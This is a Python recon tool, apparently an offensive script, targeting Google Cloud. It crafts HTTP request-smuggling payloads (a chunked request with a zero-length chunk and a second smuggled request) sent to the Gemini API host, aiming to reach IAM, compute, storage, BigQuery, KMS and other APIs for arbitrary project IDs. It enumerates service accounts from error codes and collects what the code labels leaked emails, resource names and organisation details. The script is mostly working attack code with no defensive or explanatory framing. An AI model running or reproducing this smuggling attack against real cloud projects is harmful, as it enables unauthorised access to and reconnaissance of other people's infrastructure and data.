## gcloud services enable storage-api.googleapis.com
## gcloud services enable pubsub.googleapis.com
## gcloud services enable cloudfunctions.googleapis.com
## gcloud services enable generativelanguage.googleapis.com
import socket
import ssl
import re
import time
import sys
import os

# Fix color codes for Windows
def init_colors():
    if os.name == 'nt':
        os.system('color')

init_colors()

class GoogleCloudRecon:
    def __init__(self, token):
        self.token = token
        self.base_host = "generativelanguage.googleapis.com"
        self.gemini_key = "GEMINI_API_KEY"
        
        # Fixed color codes that work on all platforms
        self.RED = '\x1b[91m'
        self.GREEN = '\x1b[92m'
        self.YELLOW = '\x1b[93m'
        self.BLUE = '\x1b[94m'
        self.PURPLE = '\x1b[95m'
        self.CYAN = '\x1b[96m'
        self.BOLD = '\x1b[1m'
        self.END = '\x1b[0m'

    def send_smuggled_request(self, host, endpoint, method="GET", body=""):
        request = (
            f"POST /v1/models/gemini-2.5-flash:generateContent?key={self.gemini_key} HTTP/1.1\r\n"
            f"Host: {self.base_host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
        )
        
        if method == "POST":
            request += (
                f"POST {endpoint} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Authorization: Bearer {self.token}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
                f"{body}"
            )
        else:
            request += (
                f"GET {endpoint} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Authorization: Bearer {self.token}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            ssl_sock = ssl.create_default_context().wrap_socket(sock, server_hostname=self.base_host)
            ssl_sock.connect((self.base_host, 443))
            ssl_sock.send(request.encode())
            
            response = b""
            start_time = time.time()
            while time.time() - start_time < 10:
                try:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                except:
                    break
            
            ssl_sock.close()
            return response.decode('utf-8', errors='ignore')
        except Exception as e:
            return f"ERROR: {str(e)}"

    def extract_project_number(self, project_id):
        print(f"{self.BLUE}[*]{self.END} Extracting project number for: {project_id}")
        
        response = self.send_smuggled_request(
            "serviceusage.googleapis.com",
            f"/v1/projects/{project_id}/services"
        )
        
        match = re.search(r'\[(projects/(\d+))\]', response)
        if match:
            project_number = match.group(2)
            print(f"{self.GREEN}[+]{self.END} Found project number: {project_number}")
            return project_number
        
        match = re.search(r'projects/(\d{10,})', response)
        if match:
            project_number = match.group(1)
            print(f"{self.GREEN}[+]{self.END} Found project number: {project_number}")
            return project_number
        
        print(f"{self.RED}[-]{self.END} Cannot find project number")
        return None

    def generate_service_accounts(self, project_number):
        accounts = {
            "core_services": [
                f"{project_number}-compute@developer.gserviceaccount.com",
                f"{project_number}@cloudservices.gserviceaccount.com",
                f"service-{project_number}@gae-api-prod.google.com.iam.gserviceaccount.com",
            ],
            "cloud_products": [
                f"service-{project_number}@gs-project-accounts.iam.gserviceaccount.com",
                f"bq-{project_number}@bigquery-encryption.iam.gserviceaccount.com",
                f"service-{project_number}@gcf-admin-robot.iam.gserviceaccount.com",
                f"service-{project_number}@compute-system.iam.gserviceaccount.com",
                f"service-{project_number}@gcp-sa-pubsub.iam.gserviceaccount.com",
                f"service-{project_number}@container-engine-robot.iam.gserviceaccount.com",
                f"service-{project_number}@gcp-sa-cloudbuild.iam.gserviceaccount.com",
                f"service-{project_number}@dataproc-accounts.iam.gserviceaccount.com",
                f"service-{project_number}@dataflow-service-producer-prod.iam.gserviceaccount.com",
                f"service-{project_number}@gcp-sa-cloud-sql.iam.gserviceaccount.com",
                f"service-{project_number}@firebase-sa-management.iam.gserviceaccount.com",
                f"service-{project_number}@gcp-sa-aiplatform.iam.gserviceaccount.com",
                f"service-{project_number}@gcp-sa-apigee.iam.gserviceaccount.com",
                f"service-{project_number}@gcp-sa-cloudtasks.iam.gserviceaccount.com",
            ]
        }
        return accounts

    def check_service_account(self, project_number, sa_email):
        endpoint = f"/v1/projects/{project_number}/serviceAccounts/{sa_email}"
        response = self.send_smuggled_request("iam.googleapis.com", endpoint)
        
        result = {"email": sa_email, "exists": False, "details": {}}
        
        if 'HTTP/1.1 403' in response:
            result["exists"] = True
            result["details"]["status"] = "403_FORBIDDEN"
            
            if 'PERMISSION_DENIED' in response:
                result["details"]["error_type"] = "PERMISSION_DENIED"
            elif 'AUTH_PERMISSION_DENIED' in response:
                result["details"]["error_type"] = "AUTH_PERMISSION_DENIED"
            
            if 'does not have permission' in response:
                match = re.search(r'does not have permission.*?(?:to|on)', response)
                if match:
                    result["details"]["missing_permission"] = match.group(0)
        
        elif 'HTTP/1.1 404' in response:
            result["details"]["status"] = "404_NOT_FOUND"
            result["details"]["error_type"] = "SERVICE_NOT_ENABLED"
        
        elif 'HTTP/1.1 200' in response:
            result["exists"] = True
            result["details"]["status"] = "200_ACCESS"
            result["details"]["warning"] = "DIRECT_ACCESS_TO_SERVICE_ACCOUNT"
        
        return result

    def test_resource_access(self, project_number):
        tests = [
            ("compute_instances", "compute.googleapis.com", f"/compute/v1/projects/{project_number}/aggregated/instances"),
            ("storage_buckets", "storage.googleapis.com", f"/storage/v1/b?project={project_number}"),
            ("bigquery_datasets", "bigquery.googleapis.com", f"/bigquery/v2/projects/{project_number}/datasets"),
            ("cloud_functions", "cloudfunctions.googleapis.com", f"/v1/projects/{project_number}/locations/-/functions"),
            ("pubsub_topics", "pubsub.googleapis.com", f"/v1/projects/{project_number}/topics"),
            ("cloud_sql", "sqladmin.googleapis.com", f"/sql/v1beta4/projects/{project_number}/instances"),
            ("kms_keys", "cloudkms.googleapis.com", f"/v1/projects/{project_number}/locations/-/keyRings"),
            ("service_accounts", "iam.googleapis.com", f"/v1/projects/{project_number}/serviceAccounts"),
        ]
        
        results = {}
        for name, host, endpoint in tests:
            print(f"{self.BLUE}[*]{self.END} Testing {name} access...")
            response = self.send_smuggled_request(host, endpoint)
            
            results[name] = {
                "host": host,
                "endpoint": endpoint,
                "response_code": self.extract_http_code(response),
                "access_level": self.analyze_access_level(response),
                "leaked_info": self.extract_leaked_info(response, project_number)
            }
            
            time.sleep(0.2)
        
        return results

    def extract_http_code(self, response):
        match = re.search(r'HTTP/1\.1\s+(\d+)', response)
        return match.group(1) if match else "UNKNOWN"

    def analyze_access_level(self, response):
        if 'HTTP/1.1 200' in response:
            return "FULL_ACCESS"
        elif 'HTTP/1.1 403' in response:
            if 'does not have permission' in response:
                return "PERMISSION_DENIED_WITH_INFO"
            elif 'SERVICE_DISABLED' in response:
                return "SERVICE_DISABLED"
            else:
                return "GENERIC_FORBIDDEN"
        elif 'HTTP/1.1 404' in response:
            return "NOT_FOUND"
        else:
            return "UNKNOWN"

    def extract_leaked_info(self, response, project_number):
        leaked = {}
        
        emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', response)
        filtered_emails = [e for e in emails if 'ghoulssa2026' not in e.lower() and 'gserviceaccount.com' not in e]
        if filtered_emails:
            leaked["emails"] = filtered_emails
        
        resource_patterns = [
            r'"name":\s*"([^"]+)"',
            r'"resourceName":\s*"([^"]+)"',
            r'"parent":\s*"([^"]+)"',
        ]
        
        resources = []
        for pattern in resource_patterns:
            matches = re.findall(pattern, response)
            for match in matches:
                if project_number in match or 'projects/' in match:
                    resources.append(match)
        
        if resources:
            leaked["resources"] = resources
        
        urls = re.findall(r'"activationUrl":\s*"([^"]+)"', response)
        if urls:
            leaked["activation_urls"] = urls
        
        org_match = re.search(r'"(organization|folder)":\s*"([^"]+)"', response)
        if org_match:
            leaked["organization_info"] = {org_match.group(1): org_match.group(2)}
        
        return leaked

    def scan_project(self, project_id):
        print(f"\n{self.CYAN}{'='*80}{self.END}")
        print(f"{self.BOLD}SCANNING PROJECT: {project_id}{self.END}")
        print(f"{self.CYAN}{'='*80}{self.END}")
        
        project_number = self.extract_project_number(project_id)
        if not project_number:
            print(f"{self.RED}[-]{self.END} Cannot proceed without project number")
            return
        
        print(f"\n{self.BOLD}{self.YELLOW}[ SERVICE ACCOUNTS TEST ]{self.END}")
        service_accounts = self.generate_service_accounts(project_number)
        sa_results = []
        
        for category, accounts in service_accounts.items():
            for account in accounts:
                result = self.check_service_account(project_number, account)
                sa_results.append(result)
                
                if result["exists"]:
                    if result["details"]["status"] == "200_ACCESS":
                        print(f"{self.YELLOW}[!]{self.END} {account} - DIRECT ACCESS (200)")
                    else:
                        print(f"{self.GREEN}[+]{self.END} {account} - EXISTS (403)")
                else:
                    print(f"{self.RED}[-]{self.END} {account} - NOT FOUND (404)")
        
        print(f"\n{self.BOLD}{self.YELLOW}[ RESOURCE ACCESS TEST ]{self.END}")
        resource_results = self.test_resource_access(project_number)
        
        print(f"\n{self.BOLD}{self.GREEN}[ SUMMARY ]{self.END}")
        print(f"{self.BLUE}[*]{self.END} Project: {project_id}")
        print(f"{self.BLUE}[*]{self.END} Project Number: {project_number}")
        print(f"{self.BLUE}[*]{self.END} Service Accounts Tested: {len(sa_results)}")
        
        existing_sas = len([sa for sa in sa_results if sa.get("exists")])
        print(f"{self.BLUE}[*]{self.END} Existing Service Accounts: {existing_sas}")
        
        print(f"\n{self.GREEN}{'='*80}{self.END}")
        print(f"{self.BOLD}{self.GREEN}SCAN COMPLETED{self.END}")
        print(f"{self.GREEN}{'='*80}{self.END}\n")

def main():
    if len(sys.argv) < 2:
        print(f"\x1b[91mUsage: python {sys.argv[0]} <project_id> [project_id2 ...]\x1b[0m")
        print(f"\x1b[91mExample: python {sys.argv[0]} test-dev-484115\x1b[0m")
        sys.exit(1)
    
    TOKEN = "OAuth_2.0_Token"
    
    scanner = GoogleCloudRecon(TOKEN)
    
    for project_id in sys.argv[1:]:
        scanner.scan_project(project_id)

if __name__ == "__main__":
    main()